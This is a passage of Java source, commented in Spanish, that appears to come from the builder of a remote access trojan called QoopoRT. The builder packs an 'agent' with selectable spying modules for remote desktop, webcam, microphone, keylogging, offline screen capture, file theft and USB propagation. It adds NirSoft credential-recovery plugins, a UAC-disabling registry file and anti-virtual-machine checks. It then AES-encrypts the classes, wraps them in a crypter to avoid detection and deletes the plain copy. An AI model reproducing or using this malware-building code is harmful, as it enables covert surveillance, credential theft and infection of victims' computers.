//                            p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/nirsoft/" + plugin + ".rpl"))));
//                            lstPlugins.add(p1);
//                        }
                        Archivo p1 = new Archivo();
                        p1.setNombre("QoopoRTPlugNirsoft.jar");
                        p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p4/QoopoRTPlugNirsoft.jar"))));
                        lstPlugins.add(p1);
                    }

                    if (!lstPlugins.isEmpty()) {
                        ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                        SerializarUtil.escribirStream(lstPlugins, outAd);
                        salida.putNextEntry(new JarEntry("plugins.dat"));
                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(outAd.toByteArray()));
                        salida.write(datosAdjuntos);
                        salida.closeEntry();
                        agregarLog("\tPlugins agregados " + Util.convertirBytes(datosAdjuntos.length));

                    }
                } catch (Exception e) {
                }

                //archivo reg para deshablitar uac
                try {
                    if (this.panelOpciones.getFn_desUAC().isSelected()) {
                        salida.putNextEntry(new JarEntry("uac.dat"));
                        byte[] entrada = Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/uac.dat"));
                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(entrada));
                        salida.write(datosAdjuntos);
                        salida.closeEntry();
                        agregarLog("\tUac agregado " + Util.convertirBytes(datosAdjuntos.length));
                    }
                } catch (Exception e) {

                }

                //archivo pafish ára deteccion de entornos virtualizados windows
                try {
                    if (this.panelANTIVM.getAntiVM_windows().isSelected()) {
                        salida.putNextEntry(new JarEntry("avmw.dat"));
                        byte[] entrada = Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/pafish.dat"));
                        byte[] datosAdjuntos = AES.cifrar(passCifradoConfig, Compresor.comprimirGZIP(entrada));
                        salida.write(datosAdjuntos);
                        salida.closeEntry();
                        agregarLog("\tPafish.exe agregado " + Util.convertirBytes(datosAdjuntos.length));
                    }
                } catch (Exception e) {

                }

                //fin de la libreria del webcam
                byte[] BUF = new byte[1024];
                JarEntry entry;
                agregarLog("========================================================================================");
                this.agregarLog("\tComienza escritura del cliente.");
                while ((entry = input.getNextJarEntry()) != null) {
                    //if (!"META-INF/MANIFEST.MF".equals(entry.getName())) {
                    if (!entry.getName().contains("META-INF/MANIFEST.MF")) {
                        if (validarClase(entry.getName())) {
                            agregarLog("\t" + entry.getName());
                            if (((entry.getName().contains("rt/Servicio.class"))
                                    || (entry.getName().contains("rt/modulos/escritorio/V3/ER.class"))//EscritorioRemoto v3
                                    || (entry.getName().contains("rt/modulos/escritorio/V1/ER.class"))//EscritorioRemoto v1
                                    || (entry.getName().contains("rt/modulos/escritorio/V2/ER.class"))//EscritorioRemoto v2
                                    || (entry.getName().contains("rt/modulos/escritorio/comunes/Envio.class"))//EscritorioRemoto V2
                                    || (entry.getName().contains("rt/modulos/escritorio/comunes/Pantalla.class"))//EscritorioRemoto
                                    || (entry.getName().contains("rt/modulos/cam/CWC.class"))//captura webcam
                                    || (entry.getName().contains("rt/modulos/archivos/SAR.class"))//enviararchivo
                                    || (entry.getName().contains("rt/modulos/archivos/DAR.class"))//recibir archivo
                                    || (entry.getName().contains("rt/modulos/archivos/BAR.class"))//buscar archiv
                                    || (entry.getName().contains("rt/modulos/voip/MIC.class"))
                                    || (entry.getName().contains("rt/util/REG.class"))//acceso registro
                                    || (entry.getName().contains("rt/util/INST.class"))//instalador
                                    || (entry.getName().contains("rt/util/DINST.class"))//desinstalar
                                    || (entry.getName().contains("rt/util/USB.class"))
                                    || (entry.getName().contains("rt/modulos/var/COFF.class"))//captura offline
                                    || (entry.getName().contains("rt/modulos/var/UAC.class"))
                                    || (entry.getName().contains("rt/modulos/var/AVM.class"))
                                    //|| (entry.getName().contains("rt/modulos/CapturaKLOffline.class"))
                                    || (entry.getName().contains("rt/modulos/OPC.class"))
                                    || (entry.getName().contains("rt/RtServer.class"))
                                    || (entry.getName().contains("rt/CONAR.class"))
                                    || (entry.getName().contains("rt/ServiceLoader.class"))
                                    || (entry.getName().contains("param.dat"))
                                    || (entry.getName().contains("rt/RATServer.class")) //|| (entry.getName().contains("rt/gui/Ventana.class"))
                                    )
                                    && (!entry.isDirectory())
                                    && (!entry.getName().contains("$"))
                                    && (!entry.getName().contains("_"))) {
                                JarEntry tmp = new JarEntry(entry.getName().replace(".class", ".cla"));
                                salida.putNextEntry(tmp);
                                ByteArrayOutputStream otmp = new ByteArrayOutputStream();
                                int i;
                                while ((i = input.read(BUF)) > -1) {
                                    otmp.write(BUF, 0, i);
                                }
                                otmp.close();
                                byte[] datos;
                                this.agregarLog("\t\tCifrando");
                                datos = AES.cifrar(panelCifrado.getKey().getText(), Compresor.comprimirGZIP(otmp.toByteArray()));
                                salida.write(datos);
                                salida.closeEntry();
                                this.agregarLog("\t\tCifrado");
                            } else { //las demas clases no las encripta ni las comprime
                                salida.putNextEntry(entry);
                                int i;
                                while ((i = input.read(BUF)) > -1) {
                                    salida.write(BUF, 0, i);
                                }
                                salida.closeEntry();
                            }
                        }
                    }
                }
                salida.flush();
                salida.close();
                input.close();
                fout.close();
                fout = null;
                salida = null;
                input = null;
                agregarLog("========================================================================================");
                this.agregarLog(new StringBuilder().append("Agente creado correctamente...\n").append(destino.getAbsolutePath()).toString());
                this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
//                JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente creado correctamente. Se procede a cifrar...\n").append(destino.getAbsolutePath()).toString());
                cifrarArchivo(destino, destinoCifrado, true);
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

//    public void changeLenguage(ResourceBundle rb) {
//        setTitle(rb.getString("servidor.titulo"));
//        this.tabs.setTitleAt(0, rb.getString("servidor.conexion"));
//        this.tabs.setTitleAt(1, rb.getString("servidor.autoinicio"));
//        this.lblPassword.setText(rb.getString("servidor.contrasena"));
//        this.lblPuerto1.setText(rb.getString("servidor.puerto"));
//        this.lblPuerto2.setText(rb.getString("servidor.puerto2"));
//        this.btnCrearServer.setText(rb.getString("servidor.crear"));
//        this.lblAutoInicio.setText(rb.getString("servidor.windows"));
//        this.lblEntradaRegistro.setText(rb.getString("servidor.registro"));
//        this.lblNombreJar.setText(rb.getString("servidor.nobrereg"));
//    }
    //valido clases que dependen de la seleccion en la configuración,
    // si no se ls va a necesitar no las agrego
    private boolean validarClase(String clase) {

        if (clase.contains("AVM")) {
            return panelANTIVM.getAntiVM_linux().isSelected() || panelANTIVM.getAntiVM_windows().isSelected();
        }
        if (clase.contains("ServiceLoader")) {//solo si se va ainstalar como servicio
            return panelInstalar.getServicio().isSelected();
        }

        if (clase.contains("BufferPantalla")) {//este buffer ya no se usa
            return false;
        }

        if (clase.contains("rt/CONAR.class")) {//Conexion de archivos en caso de conexion directa
            return !this.panelConexion.getConexionInversa().isSelected();
        }

        if (clase.contains("rt/modulos/var/COFF.class")) {//captura offline
            return this.panelEspiar.getCapturaOfflinePantalla().isSelected();
        }

        if (clase.contains("rt/util/USB.class")) {
            return this.panelPropagacion.getCheckUSB().isSelected();
        }

        if (clase.contains("rt/modulos/CapturaKLOffline.class")) {
            return this.panelEspiar.getCapturaOfflinePantalla().isSelected();
        }
        if (clase.contains("rt/util/INST.class") || clase.contains("rt/util/REG.class")) {
            return this.panelInstalar.getLblAutoInicio().isSelected();
        }
        if (clase.contains("rt/modulos/escritorio/V1/ER.class")) { //escritorio remoto
            return this.panelOpciones.getFn_escritorioRemoto().isSelected();
        }
        if (clase.contains("rt/modulos/escritorio/V2/ER.class")) { //escritorio remoto
            return this.panelOpciones.getFn_escritorioRemoto().isSelected();
        }
        if (clase.contains("rt/modulos/escritorio/V2/Envio.class")) { //escritorio remoto
            return this.panelOpciones.getFn_escritorioRemoto().isSelected();
        }
        if (clase.contains("rt/modulos/escritorio/comunes/Pantalla.class")) { //escritorio remoto
            return this.panelOpciones.getFn_escritorioRemoto().isSelected();
        }
        if (clase.contains("rt/modulos/escritorio/comunes/BufferCaptura.class")) { //escritorio remoto
            return this.panelOpciones.getFn_escritorioRemoto().isSelected();
        }
        if (clase.contains("rt/modulos/escritorio/comunes/BufferPantalla.class")) { //escritorio remoto
            return this.panelOpciones.getFn_escritorioRemoto().isSelected();
        }
        if (clase.contains("rt/modulos/cam/CWC.class")) {
            return this.panelOpciones.getFn_capturaCamara().isSelected();
        }
        if (clase.contains("rt/modulos/arhivos/SAR.class")) {//enviar archivo
            return this.panelOpciones.getFn_descargararchivos().isSelected();
        }
        if (clase.contains("rt/modulos/voip/MIC.class")) {
            return this.panelOpciones.getFn_capturaAudio().isSelected();
        }

        if (clase.contains("rt/modulos/var/UAC.class")) {
            return this.panelOpciones.getFn_desUAC().isSelected();
        }

        if (clase.contains("rt/modulos/archivos/BAR.class")) {
            return this.panelOpciones.getFn_buscarArchivos().isSelected();
        }

        if (clase.contains("rt/gui/Ventana.class")) {
            return this.panelOpciones.getFn_Ventana().isSelected();
        }
        return true;
    }

    /**
     * Cifra el servidor con Crypter
     *
     * @param original
     * @param destino
     */
    private void cifrarArchivo(File original, File destino, boolean eliminar) {
        try {
            agregarLog("=======================================================");
            agregarLog("\t\tCreando Agente Cifrado");
            agregarLog("=======================================================");
            JarInputStream input = new JarInputStream(getClass().getResourceAsStream("/extras/lib/QoopoRTCrypter.jar"));
            FileOutputStream fout = new FileOutputStream(destino);
            JarOutputStream salida = new JarOutputStream(fout, input.getManifest());
            salida.setComment("--");
            //AGREGO EL SERVIDOR COMO ARCHIVO ADJUNTO
            try {
                List<F> lst = new ArrayList();
                F archivo = new F();
                archivo.setNombre(original.getName());
                //archivo.setIcono(Compresor.comprimirGZIP(ArchivoUtil.bytesArchivo(original)));
                archivo.setContenido(ArchivoUtil.bytesArchivo(original));
                lst.add(archivo);
                agregarLog("=======================================================");
                agregarLog("\tAgregando Agente");
                ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                SerializarUtil.escribirStream(lst, outAd);
                salida.putNextEntry(new JarEntry("dat.dat"));
                byte[] datosAdjuntos = AES.cifrar(passCifradoCripter, outAd.toByteArray());
                salida.write(datosAdjuntos);
                salida.closeEntry();
                agregarLog("\tArchivos adjuntos agregados " + Util.convertirBytes(datosAdjuntos.length));
            } catch (Exception e) {
            }

            byte[] BUF = new byte[1024];
            JarEntry entry;
            agregarLog("=======================================================");
            this.agregarLog("\tComienza escritura del Crypter.");

            while ((entry = input.getNextJarEntry()) != null) {
                //if (!"META-INF/MANIFEST.MF".equals(entry.getName())) {
                if (!entry.getName().contains("META-INF/MANIFEST.MF")) {
                    if (validarClase(entry.getName())) {
                        agregarLog("\t" + entry.getName());
                        salida.putNextEntry(entry);
                        int i;
                        while ((i = input.read(BUF)) > -1) {
                            salida.write(BUF, 0, i);
                        }
                        salida.closeEntry();
                    }
                }
            }
            salida.flush();
            salida.close();
            fout.close();
            input.close();
            agregarLog("=======================================================");

            salida = null;
            fout = null;
            input = null;

            if (eliminar) {
                boolean eliminado = original.delete();
                if (!eliminado) {
                    this.agregarLog("ADVERTENCIA !!! No se pudo eliminar el archivo sin cifrar " + original.getAbsolutePath());
                    this.agregarLog("ADVERTENCIA !!! El archivo cifrado es " + destino.getAbsolutePath());
                    original.deleteOnExit();
                }
            }
            this.agregarLog(new StringBuilder().append("Agente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
            this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
            JOptionPane.showMessageDialog(this, new StringBuilder().append("Agente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());

        } catch (IOException ex) {
            Logger.getLogger(CrearCliente.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    static class CeldaIcono extends DefaultTableCellRenderer {

        @Override
        public void setValue(Object value) {
            try {
                setIcon(Util.cargarIcono16("/resources/username.png"));
            } catch (Exception e) {
            }
        }
    }

}
